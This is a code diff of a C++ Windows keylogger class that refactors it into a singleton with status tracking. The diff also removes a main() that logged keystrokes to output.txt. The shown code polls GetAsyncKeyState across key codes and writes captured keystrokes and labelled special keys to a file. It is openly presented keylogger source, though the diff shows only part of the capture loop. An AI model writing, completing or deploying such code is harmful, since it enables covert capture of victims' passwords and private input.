@@ -1,32 +1,18 @@
-#include <iostream>
-#include <windows.h>
-#include <string>
-#include <vector>
-#include <unordered_map>
-#include <fstream>
-#include <time.h>
+#include "keylogger.h"
 
-#include <thread>
+KeyLogger* KeyLogger::instance = nullptr;
 
-using namespace std;
+KeyLogger* KeyLogger::getInstance(const string& file_name) {
+	if (!instance) instance = new KeyLogger(file_name);
+	return instance;
+}
+void KeyLogger::deleteInstance() {
+	if (instance) {
+		delete instance;
+		instance = nullptr;
+	}
+}
 
-#define IS_PRESSING	1 << (sizeof(SHORT) * 8 - 1)
-#define PRESSED	1
-
-class KeyLogger {
-	private:
-		string file_name;
-		static unordered_map<int, string> vkey;
-		bool getSpecialKey(int key, string& key_name);
-		void keylog();
-		bool running;
-		const int max_running_time = 300;
-
-	public:
-		KeyLogger(string file_name) : file_name(file_name) {} 
-		void start() {running = true; keylog();}
-		void stop() {running = false;}
-};
 
 unordered_map<int, string> KeyLogger::vkey = {
 			{VK_TAB, "[ TAB ]"},
@@ -92,11 +78,14 @@ bool KeyLogger::getSpecialKey(int key, string& key_name) {
 
 void KeyLogger::keylog() {
 	ofstream fout (file_name);
-	if (!fout.good()) return;
+	if (!fout.good()) {
+		status = 1;
+		return;
+	}
 
 	int key;
 	string key_name;
-
+	status = RUNNING;
 	// clear keystroke recorded before
 	for (key = 0x08; key <= 0xE2; key++) {
 		GetAsyncKeyState(key);
@@ -117,16 +106,13 @@ void KeyLogger::keylog() {
 	}
 
 	fout.close();
+	status = 0;
 }
 
+string KeyLogger::getOutputFile() {
+	return file_name;
+}
 
-int main() {
-	KeyLogger kl("output.txt");
-
-	thread t1 (&KeyLogger::start, &kl);
-
-	t1.join();
-	
-	
-	return 0;
+int KeyLogger::getStatus() {
+	return status;
 }
